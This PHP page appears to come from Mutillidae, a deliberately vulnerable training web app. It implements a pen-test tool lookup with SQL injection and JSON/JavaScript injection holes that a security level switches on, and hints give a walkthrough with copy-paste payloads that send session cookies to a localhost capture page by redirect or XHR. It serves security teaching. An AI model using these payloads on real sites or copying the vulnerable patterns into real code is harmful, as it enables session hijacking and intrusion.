<?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure.
    			$lUseJavaScriptValidation = FALSE;
    			$lUseServerSideValidation = FALSE;
   				$lEncodeOutput = FALSE;
				$lTokenizeAllowedMarkup = FALSE;
				$lProtectAgainstSQLInjection = FALSE;
				$lProtectAgainstGETforPOST = FALSE;	
			break;

    		case "1": // This code is insecure.
    			$lUseJavaScriptValidation = TRUE;
    			$lUseServerSideValidation = FALSE;
				$lEncodeOutput = FALSE;
				$lTokenizeAllowedMarkup = FALSE;
				$lProtectAgainstSQLInjection = FALSE;
				$lProtectAgainstGETforPOST = FALSE;    		
			break;

	   		case "2":
	   		case "3":
	   		case "4":
    		case "5": // This code is fairly secure
    			$lUseJavaScriptValidation = TRUE;
    			$lUseServerSideValidation = TRUE;
    			$lProtectAgainstGETforPOST = TRUE;
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 */
	   			// encode the output following OWASP standards
	   			// this will be HTML encoding because we are outputting data into HTML
				$lEncodeOutput = TRUE;
				
				/* Business Problem: Sometimes the business requirements define that users
				 * should be allowed to use some HTML  markup. If unneccesary, this is a
				 * bad idea. Output encoding will naturally kill any users attempt to use HTML
				 * in their input, which is exactly why we use output encoding. 
				 * 
				 * If the business process allows some HTML, then those HTML items are elevated
				 * from "mallicious input" to "direct object refernces" (a resource to be enjoyed).
				 * When we want to restrict a user to using to "direct object refernces" (a 
				 * resource to be enjoyed) responsibly, we use mapping. Mapping allows the user
				 * to chose from a "system generated" (that's us programmers) set of tokens
				 * to pick from. We need to assure that the user either chooses one of the tokens
				 * we offer, or our system rejects the request. To put it bluntly, either the user
				 * follows the rules, or their output is encoded. Period.
				 */
				$lTokenizeAllowedMarkup = TRUE;
				
				/* If we are in secure mode, we need to protect against SQLi */
				$lProtectAgainstSQLInjection = TRUE;
    		break;
    	}// end switch
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error setting up configuration on page pentest-lookup-tool.php");
	}// end try	

	//--------------------------------------------
	//Get the tools to populate the drop down box
	//--------------------------------------------
	try{
		$lQueryString  = "SELECT tool_id, tool_name FROM pen_test_tools;";
		$qPenTestToolOptions = $MySQLHandler->executeQuery($lQueryString);
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $lQueryString);
	}// end try
	
	//--------------------------------------------------------
	//If the user selected a tool, get the data for that tool
	//--------------------------------------------------------
	try {
		if ($lProtectAgainstGETforPOST) {
			$lPostedButton = $_POST["pen-test-tool-lookup-php-submit-button"];
			$lPostedToolID = $_POST["ToolID"];
		}else{
			$lPostedButton = $_REQUEST["pen-test-tool-lookup-php-submit-button"];
			$lPostedToolID = $_REQUEST["ToolID"];
		}//end if

		if(!empty($lPostedButton)){
			
			if ($lProtectAgainstSQLInjection) {
				$lPostedToolID = $MySQLHandler->escapeDangerousCharacters($lPostedToolID);
			}//end if		
			
			if ($lPostedToolID == "0923ac83-8b50-4eda-ad81-f1aac6168c5c" || strlen($lPostedToolID) == 0){
				$lErrorNoChoiceMade = TRUE;
			}else{
				$lErrorNoChoiceMade = FALSE;
				
				if ($lPostedToolID != "c84326e4-7487-41d3-91fd-88280828c756"){
					$lWhereClause = " WHERE tool_id = '".$lPostedToolID."';";
				}else{
					$lWhereClause = ";";
				}// end if
				
				try{
					$lQueryString  = "SELECT tool_id, tool_name, phase_to_use, tool_type, comment 
						   FROM pen_test_tools" . 
						   $lWhereClause;			
					$qPenTestToolResults = $MySQLHandler->executeQuery($lQueryString);
				} catch (Exception $e) {
					echo $CustomErrorHandler->FormatError($e, $lQueryString);
				}// end try
			    
				try {
					$lPenTestToolsDetails = "";
					$lPenTestToolsJSON = 
						'{"query": {"toolIDRequested": "'.$lPostedToolID.'", "penTestTools": [';
					if($qPenTestToolResults->num_rows > 0){
						while($row = $qPenTestToolResults->fetch_object()){
							$lPenTestToolsDetails .= json_encode($row) . ",";
						}// end while
						$lPenTestToolsJSON .= substr($lPenTestToolsDetails, 0, strlen($lPenTestToolsDetails)-1);
					}//end if
					$lPenTestToolsJSON .= ']}}';
					
					//print $lPenTestToolsJSON;
				} catch (Exception $e) {
    				throw (new Exception("Error working with query results"));
				}// end try			    
			    
			}// end if user didnt pick anything
			
		}// end if user didnt click submit
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try	
?>

<?php 
	try{
   		$lJSONInjectionPointBallonTip = $BubbleHintHandler->getHint("JSONInjectionPoint");
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error attempting to execute query to fetch bubble hints.");
	}// end try
?>

<script type="text/javascript">
	$(function() {
		$('[JSONInjectionPoint]').attr("title", "<?php echo $lJSONInjectionPointBallonTip; ?>");
		$('[JSONInjectionPoint]').balloon();
	});
</script>

<div class="page-title">Pen Test Tool Lookup</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->
<script type="text/javascript">
	
	<?php 
		if ($lUseJavaScriptValidation){
			echo "var gUseJavaScriptValidation = \"TRUE\";".PHP_EOL;
		}else{
			echo "var gUseJavaScriptValidation = \"FALSE\";".PHP_EOL;
		}//end if		

		if ($lErrorNoChoiceMade){
			echo "var gDisplayError = \"TRUE\";".PHP_EOL;
		}else{
			echo "var gDisplayError = \"FALSE\";".PHP_EOL;
		}//end if
		
		echo 'try{
				var gPenTestToolsJSON = ( ' . $lPenTestToolsJSON . ' );
			}catch(e){
				alert("Error trying to evaluate JSON: " + e.message);
			};' . PHP_EOL . PHP_EOL;
		//echo "alert(gPenTestToolsJSON);" . PHP_EOL . PHP_EOL;
	?>
	
	var addRow = function(pRowOfData){
		try{
			var lDocRoot = window.document;
			var lTBody = lDocRoot.getElementById("idDisplayTableBody");
			var lTR = lDocRoot.createElement("tr");

			//tool_id, tool_name, phase_to_use, tool_type, comment

			var lToolIDTD = lDocRoot.createElement("td");
			var lToolNameTD = lDocRoot.createElement("td");
			var lPhaseTD = lDocRoot.createElement("td");			
			var lToolTypeTD = lDocRoot.createElement("td");
			var lCommentTD = lDocRoot.createElement("td");

			//lKeyTD.addAttribute("class", "label");
			lToolIDTD.setAttribute("class","sub-body");
			lToolNameTD.setAttribute("class","sub-body");
			lToolNameTD.setAttribute("style","color:#770000");
			lPhaseTD.setAttribute("class","sub-body");
			lToolTypeTD.setAttribute("class","sub-body");
			lCommentTD.setAttribute("class","sub-body");
			lCommentTD.setAttribute("style","font-weight: normal");
			
			lToolIDTD.appendChild(lDocRoot.createTextNode(pRowOfData.tool_id));
			lToolNameTD.appendChild(lDocRoot.createTextNode(pRowOfData.tool_name));
			lPhaseTD.appendChild(lDocRoot.createTextNode(pRowOfData.phase_to_use));
			lToolTypeTD.appendChild(lDocRoot.createTextNode(pRowOfData.tool_type));
			lCommentTD.appendChild(lDocRoot.createTextNode(pRowOfData.comment));
			
			lTR.appendChild(lToolIDTD);
			lTR.appendChild(lToolNameTD);
			lTR.appendChild(lPhaseTD);
			lTR.appendChild(lToolTypeTD);
			lTR.appendChild(lCommentTD);
			
			lTBody.appendChild(lTR);
		}catch(/*Exception*/ e){
			alert("Error trying to add row in function addRow(): " + e.name + "-" + e.message);
		}// end try
	};//end JavaScript function addRow

	var initializePage = function(){
		try{
			document.getElementById("idToolSelect").focus();
		}catch(/*Exception*/ e){
			alert("Error trying to initialize page: " + e.message);
		}// end try
	};// end function
	
	var displayError = function(){
		try{
			if(gDisplayError == "TRUE"){
				document.getElementById("id-invalid-input-tr").style.display="";
			}// end if		
		}catch(/*Exception*/ e){
			alert("Error trying to display error: " + e.message);
		}// end try
	};// end function
	
	var displayPenTestTools = function(){
		try{
			var laTools = gPenTestToolsJSON.query.penTestTools;
			if(laTools && laTools.length > 0){
				document.getElementById("idDisplayTable").style.display="";
				for (var i=0; i<laTools.length; i++){
					addRow(laTools[i]);
				}//end for i
			}// end if
		}catch(/*Exception*/ e){
			alert("Error trying to parse JSON: " + e.message);
		}// end try
	};// end function
</script>

<fieldset style="width: 500px;">
	<legend>Pen Test Tools</legend>
	<form 	action="index.php?page=pen-test-tool-lookup.php" 
			method="post" 
			enctype="application/x-www-form-urlencoded" 
			onsubmit=""
			id="idForm">
		<table>
			<tr id="id-invalid-input-tr" style="display: none;">
				<td class="error-message" colspan="2">
					Error: Invalid Input - Please choose a tool to lookup.
				</td>
			</tr>
			<tr><td>&nbsp;</td></tr>
			<tr>
				<td class="form-header" colspan="2">Select Pen Test Tool</td>
			</tr>
			<tr><td>&nbsp;</td></tr>
			<tr>
				<td class="label" style="text-align: right;">Pen Test Tool</td>
				<td>
					<select id="idToolSelect" JSONInjectionPoint="1" name="ToolID">
						<option value="0923ac83-8b50-4eda-ad81-f1aac6168c5c" selected="selected">Please Choose Tool</option>
						<option value="c84326e4-7487-41d3-91fd-88280828c756">Show All</option>
						<?php
							try {
							    while($result = $qPenTestToolOptions->fetch_object()){

									if(!$lEncodeOutput){
										$lToolID = $result->tool_id;
										$lToolName = $result->tool_name;
									}else{
										$lToolID = $Encoder->encodeForHTML($result->tool_id);
										$lToolName = $Encoder->encodeForHTML($result->tool_name);
									}// end if

								    echo '<option value="' . $lToolID . '">' . $lToolName . '</option>' . PHP_EOL;
									
								}// end while
							} catch (Exception $e) {
								echo $CustomErrorHandler->FormatError($e, $query);
							}// end try		
						?>
					</select>
				</td>
			</tr>
			<tr><td>&nbsp;</td></tr>
			<tr>
				<td colspan="2" style="text-align: center;">
					<input name="pen-test-tool-lookup-php-submit-button" type="submit" value="Lookup Tool" class="button" />
				</td>
			</tr>
		</table>
	</form>
</fieldset>

<table id="idDisplayTable" style="display:none;">
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td class="sub-header" colspan="5">Pen Testing Tools</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td class="sub-header">Tool ID</td>
		<td class="sub-header">Tool Name</td>
		<td class="sub-header">Tool Type</td>
		<td class="sub-header">Phase Used</td>
		<td class="sub-header">Comments</td>
	</tr>
	<tbody id="idDisplayTableBody" style="font-weight:bold;"></tbody>
	<tr><td>&nbsp;</td></tr>
</table>

<script type="text/javascript">
<!--
	initializePage();
	displayError();
	displayPenTestTools();
//-->
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<div>&nbsp;</div>
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
			<br/>
			<span class="report-header">Vulnerabilities</span>
			<br/><br/>
			This page is at least vulnerable to JSON injection, cross site scripting, 
			JavaScript injection, and SQL injection. See what you can do before going further.
			<br/><br/>
			<span class="report-header">JSON Injection: Finding Inputs</span>
			<br/><br/>
			JSON injection starts like any injection; find the possible input parameters including
			adding custom parameters (parameter addition attack) to see if the application will
			process them and place those inputs into the JSON returned by the server. (If we 
			cannot get our input into the JSON returned by the server, we cannot inject the JSON.)
			<br/><br/>
			Finding input parameters can be done using an ordinary Firefox browser. No special tools
			are required. This particular page has a drop down which is an input. Developers sometimes
			think that they control the web page. This of course is incorrect. The web page is running 
			in the users browser. The user can do anything they want like change the page using Firebug.
			If you dont like that drop-down, change it to an input box. Then you can type in whatever 
			you like. 
			<br/><br/>
			Inputs can be found more efficiently and more consistently using repeatable processes 
			executed with interception-proxies you are familiar with through practice. A simple,
			easy to use interception proxy is Tamper Data. It is a plugin for Firefox. It is quick
			but limited in ability. Still it is a great add-on for quick and dirty testing.
			<br/><br/>
			A better interception proxy is Burp-Suite. The free version is quite capible and the Pro
			version is worth every penny to a professional. The drawback to Burp is that the browser
			must be proxied to Burp and the tool has a learning curve. For new users, the concept
			of proxying the browser to another peice of software rather than just browsing to a site
			can be weird. You only have to learn once. The Proxy Selector add-on for Firefox can
			make switching between Burp and no proxy easier.
			<br/><br/>
			Browse to this page with Burp as the proxy. Look in the "Proxy" tab, then the "Intercept"
			sub-tab to see the raw request. If new, use the "Params" sub-sub-tab to aid in
			understanding the input parameters to the page. 
			<br/><br/>
			If we look at the capture by Burp, we can see some input areas. They are marked with the 
			funny symbols in this example capture.
			<br/>
<code>
POST /mutillidae/index.php?page=<span class="important-code">§pen-test-tool-lookup.php§</span> HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
DNT: 1
Proxy-Connection: keep-alive
Referer: http://localhost/mutillidae/index.php?page=pen-test-tool-lookup.php
Cookie: PHPSESSID=<span class="important-code">§u0at2rs1d2m69m5qm2mtqsko22§</span>
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

ToolID=<span class="important-code">§7§</span>&pen-test-tool-lookup-php-submit-button=<span class="important-code">§Lookup+Tool§</span>
</code>
						<br/>
						<span class="report-header">JSON Injection: Finding injection point</span>
						<br/><br/>
						With input points identified, we send recognizable input then check the JSON
						returned by the server to see if our canary is located in the JSON. Burp is a 
						good tool for this because the "Intruder" can automatically inject each 
						input then tell us if it sees that input in the response from the server. Tools
						are not neccesary. We could just as easily check the server response by 
						viewing the source of the web page after we inject canaries but tools can
						make this process more efficient once the learning curve of the tool is
						overcome.
						<br/><br/>
						If we send the word "CANARY" into each input, we can see if that input ends up
						in the response generically (great for cross site scripting) or specifically in
						the JSON (which means we might be able to perform JSON injection). You can inject
						with Firebug by adding "CANARY" into the tool list drop down, use Burp,
						use Tamper Data, or other methods. 
						<br/><br/>
						On this page, the value sent in one particular parameter "ToolID" seems to show up
						in the response JSON. This is potentially good (or potentially bad if your 
						the developer). Lets inject ToolID and looks at the resulting JSON.
						<br/><br/>
						Get the response using your favorite method and search for your input ("Canary" in 
						this example). Here is a greatly truncated example response.
						<br/>
<code>
try{
	var gPenTestToolsJSON = ( 
		{"query": {
			"toolIDRequested": "<span class="important-code">CANARY</span>", 
			"penTestTools": []}} );
	}catch(e){
		alert("Error trying to evaluate JSON: " + e.message);
	};
</code>
<br/>
						Note the developer outputs the value of the "ToolID" parameter into the JSON.
						If the developer encodes the output as a JavaScript string, this is ok. The 
						OWASP ESAPI includes a method "encodeForJavaScript()" which performs this 
						encoding.
						<br/><br/>
						Did the developer encode the output? We will check to find out. If the developer
						did not encode, chances are the JSON is vulnerable. (What if the developer used
						input validation? In that case, try to use SQL injection to inject the payload
						into the database table from which the data is fetched. Output encoding
						will protect the site even if the database is infected by a worm, SQLi, or
						a rouge DBA.
						<br/><br/>
						To check for encoding, send it characters which most certainly should be encoded.
						This would be any characters that are not alphanumeric. This example will use
						the string "{\'"CANARY"\'}" so we can test a few useful characters in one
						test (single-quotes, double-quotes, parenthesis are all handy). 
						Here is the response. We note that the site has a defect as the characters
						are not output encoded. Again this is just a fraction of the response.
						<br/>
<code>
try{
	var gPenTestToolsJSON = ( 
		{"query": {
		"toolIDRequested": "<span class="important-code">{\'"CANARY"\'}</span>", 
		"penTestTools": []}} );
}catch(e){
	alert("Error trying to evaluate JSON: " + e.message);
};
</code>
						<br/>
						As usual, pen-testing is a lot of mapping and discovery research followed by a short exploit. 
						So far we found the inputs into the page, figured out which input is output into the JSON,
						figured out where in the JSON the output lands, and
						figured out the output is not properly encoded due to a defect.
						<br/><br/>
						The next step is exploitation. We need to decide on what context to expliot. Web pages offer choices 
						because there is more than one interpreter listening. There is obviously an HTML interpreter
						and perhaps slightly less obvious there is a JavaScript interpreter listenting. We could also
						choose to poison the existing JSON context rather than break-out into HTML or JavaScript. Perhaps
						we could poison the JSON with false values of our choosing. Lets choose to break-out into 
						JavaScript and execute some JavaScript code of our choosing as an example. 
						<br/><br/>
						This requires determining how to "escape" the currrent
						context so we can start a new command. The context is JSON. We want to break-out or
						escape the JSON and execute some JavaScript. We need to look where our canary landed
						carefully so we can end the current JSON statement and start a new JavaScript code
						statement. We need to insert characters to end the JSON by completing the JSON with the 
						characters that would naturally end the JSON. Work backwards from the canary and notate
						each character that "opened". We have a double-quote that quotes our canary, 
						before that an open curly-brace after "query",
						another open curly-brace before "query", and that opening parenthsis.
<code>
try{
	var gPenTestToolsJSON = <span class="important-code">(</span> 
		<span class="important-code">{</span>"query": <span class="important-code">{</span>
			"toolIDRequested": <span class="important-code">"</span>
</code>
						<br/>
						To break out of the JSON context, we just insert those characters counterparts to 
						"close-out" those opening characters. When injecting JavaScript it is a good idea
						to also add a semicolon to our "close-out" because valid JavaScript statements end
						in semi-colons. To deal with all the JSON that comes after
						our canary, we will insert a comment to comment all that ending JSON out. Between
						our "close-out" characters and our ending comment goes our payload. We chose 
					   JavaScript so our payload will be a well-formed JavaScript statement.
					   <br/><br/>
					   Be careful. It is important to end the statement exactly as it started. Watch out for
					   spaces that matter and be certain the order of the characters injected complements
					   the characters being closed-out. Assuming a simple alert statement is our payload, lets
					   match each character one-by-one. The double-quote, first curly-brace, second curly-brace,
					   closing parenthesis, then a semi-colon terminate the JSON. We inject our payload next, 
					   then a comment to comment-out what would have become the rest of the JSON. NOTE: We URL
					   encode certain characters (i.e. semi-colons) because they could break the web server otherwise
					   making the web-server return a 500 error. 
					   <br/>
<code>
	try{
		var gPenTestToolsJSON = <span class="important-code">(</span> 
			<span class="important-code">{</span>"query": <span class="important-code">{</span>
				"toolIDRequested": <span class="important-code">"</span><span class="important-code" style="color:red">"}} )%3b</span><span class="important-code" style="color:blue">alert(1)%3b</span><span class="important-code" style="color:green">//</span>
</code>
						<br/>
						All together the injection looks like this example. Inject this exploit instead of the word "canary".
						<br/><br/>
<code>
	<span class="important-code" style="color:red">"}} )%3b</span><span class="important-code" style="color:blue">alert(1)%3b</span><span class="important-code" style="color:green">//</span>
</code>
<!-- "}} )%3balert(1)%3b// -->
						<br/>
						Using Burp capture or View Source, view the response. Also note the popup in your browser. The JavaScript injection
						is complete.
						<br/>
<code>
try{
	var gPenTestToolsJSON = ( {"query": {"toolIDRequested": ""}} );alert(1);//", "penTestTools": []}} );
}catch(e){
	alert("Error trying to evaluate JSON: " + e.message);
};
</code>
					<br/><br/>
						Task for student: Perform an HTML injection then a JSON injection.
					<br/><br/>	
					<span class="report-header">Advanced Injections</span>
					<br/><br/>
					Following the pattern of identifying an injection point, determining a prefix
					to close out existing code, a payload, and a suffix to comment out (or complete)
					existing trailing code, we can gradually increase our payload until the 
					desired affect is achived.
					<br/><br/>
					The initial goal is to prove injected code will execute.
					<br/><br/>
					<span class="report-header">Beginner: Pop up an alert box to show injection worked</span>
					<br/><br/>
						Unencoded: &quot;}} );alert(1);//<br/>
						Complete Injection: &quot;}} )%3balert(1)%3b//<br/>
						Prefix:		&quot;}} )%3b<br/>
						Payload:	alert(1)%3b<br/>
						Suffix:		//
					<br /><br />
					Copy and Paste:
					<br />
<code>
"}} )%3balert(1)%3b//<br/>
</code>
					<br/><br/>
					<span class="report-header">Intermediate: Steal cookie with redirection</span>
					<br/><br/>
					Unencoded:<code>&quot;}} );document.location=&quot;http://localhost/mutillidae/capture-data.php?cookie=&quot; + document.cookie;//</code><br/>
					Prefix:<code>&quot;}} )%3b</code><br/>
					Payload:<code>document.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b</code><br/>
					Suffix:<code>//</code><br/>
					Complete Injection: <code>&quot;}} )%3bdocument.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b//</code>
					<br /><br />
					Copy and Paste:
					<br />
<code>
&quot;}} )%3bdocument.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b//
</code>
					<br/><br/>
					<span class="report-header">Professional: Steal cookies with XHR injection</span>
					<br/>
					--------------------------------------------------------------------------------<br/>
					Generic XHR using GET and XMLHttpRequest to steal cookies <br/>
				 	 - prefix and suffix as neccesary<br/>
				 	 - This is optimized for Firefox which has XMLHttpRequest. Some newer IE will as well.<br/>
				 	 NOTE: During Reconnassaince, study your target to determine what kind of browser<br/>
				 	 they have so the scripts can be tailored and testing for those browsers.<br/>
					--------------------------------------------------------------------------------
					<br/><br/>
					This is a &quot;UDP-style GET&quot;. We fire and forget but cannot know if succeeded or failed. Perfect
					for using against savvy users.
					<br /><br />
					Copy and Paste:
					<br />
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{ 
		var lAction = &quot;http://localhost/mutillidae/capture-data.php?cookie=&quot; + document.cookie;
		lXMLHTTP = new XMLHttpRequest(); 
		lXMLHTTP.onreadystatechange = function(){};
		lXMLHTTP.open(&quot;GET&quot;, lAction);
		lXMLHTTP.send(&quot;&quot;);
	}catch(e){} 
&lt;/script&gt; 	
</code>
<br />
					--------------------------------------<br />
					URL Encoded Version<br />
					--------------------------------------<br />
					Prefix:		&quot;}} )%3b<br />
					Payload:	var+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d<br />
					Suffix:		//<br />
					Complete Injection: &quot;}} )%3bvar+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d//
					<br /><br />
					Copy and Paste:
					<br />
<code>
&quot;}} )%3bvar+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d//
</code>
		<br />
		<span class="report-header">Steal cookies with XHR injection, Page operates normally</span>
		<br /><br />
		<br />Prefix:<br />
<code>
16&quot;, &quot;penTestTools&quot;: [{&quot;tool_id&quot;:&quot;16&quot;,&quot;tool_name&quot;:&quot;Dig&quot;,&quot;phase_to_use&quot;:&quot;Reconnaissance&quot;,&quot;tool_type&quot;:&quot;DNS Server Query Tool&quot;,&quot;comment&quot;:&quot;The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers.&quot;}]}} );<br />
</code>
		<br />
		Payload:<br />
<code>
try{ var lAction = &quot;http://localhost/mutillidae/capture-data.php?cookie=&quot; + document.cookie; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); lXMLHTTP.send(&quot;&quot;); }catch(e){};<br />
</code>
		<br />
		Suffix:<br />
<code>
//<br />
</code>
		<br />
		Complete Injection:<br />
<code>
16&quot;, &quot;penTestTools&quot;: [{&quot;tool_id&quot;:&quot;16&quot;,&quot;tool_name&quot;:&quot;Dig&quot;,&quot;phase_to_use&quot;:&quot;Reconnaissance&quot;,&quot;tool_type&quot;:&quot;DNS Server Query Tool&quot;,&quot;comment&quot;:&quot;The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers.&quot;}]}} ); try{ var lAction = &quot;http://localhost/mutillidae/capture-data.php?cookie=&quot; + document.cookie; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); lXMLHTTP.send(&quot;&quot;); }catch(e){};//<br />
</code>
		<br />
		Copy and Paste:<br />
<code>
%31%36%22%2c%20%22%70%65%6e%54%65%73%74%54%6f%6f%6c%73%22%3a%20%5b%7b%22%74%6f%6f%6c%5f%69%64%22%3a%22%31%36%22%2c%22%74%6f%6f%6c%5f%6e%61%6d%65%22%3a%22%44%69%67%22%2c%22%70%68%61%73%65%5f%74%6f%5f%75%73%65%22%3a%22%52%65%63%6f%6e%6e%61%69%73%73%61%6e%63%65%22%2c%22%74%6f%6f%6c%5f%74%79%70%65%22%3a%22%44%4e%53%20%53%65%72%76%65%72%20%51%75%65%72%79%20%54%6f%6f%6c%22%2c%22%63%6f%6d%6d%65%6e%74%22%3a%22%54%68%65%20%44%6f%6d%61%69%6e%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%20%47%72%6f%70%65%72%20%69%73%20%70%72%65%66%65%72%65%64%20%6f%6e%20%4c%69%6e%75%78%20%6f%76%65%72%20%4e%53%4c%6f%6f%6b%75%70%20%61%6e%64%20%70%72%6f%76%69%64%65%73%20%6d%6f%72%65%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%20%6e%61%74%69%76%65%6c%79%2e%20%4e%53%4c%6f%6f%6b%75%70%20%6d%75%73%74%20%62%65%20%69%6e%20%64%65%62%75%67%20%6d%6f%64%65%20%74%6f%20%67%69%76%65%20%73%69%6d%69%6c%61%72%20%6f%75%74%70%75%74%2e%20%44%49%47%20%63%61%6e%20%70%65%72%66%6f%72%6d%20%7a%6f%6e%65%20%74%72%61%6e%73%66%65%72%73%20%69%66%20%74%68%65%20%44%4e%53%20%73%65%72%76%65%72%20%61%6c%6c%6f%77%73%20%74%72%61%6e%73%66%65%72%73%2e%22%7d%5d%7d%7d%20%29%3b%20%74%72%79%7b%20%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%22%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%20%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%7d%3b%20%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%6c%41%63%74%69%6f%6e%29%3b%20%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%22%22%29%3b%20%7d%63%61%74%63%68%28%65%29%7b%7d%3b%2f%2f
</code>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>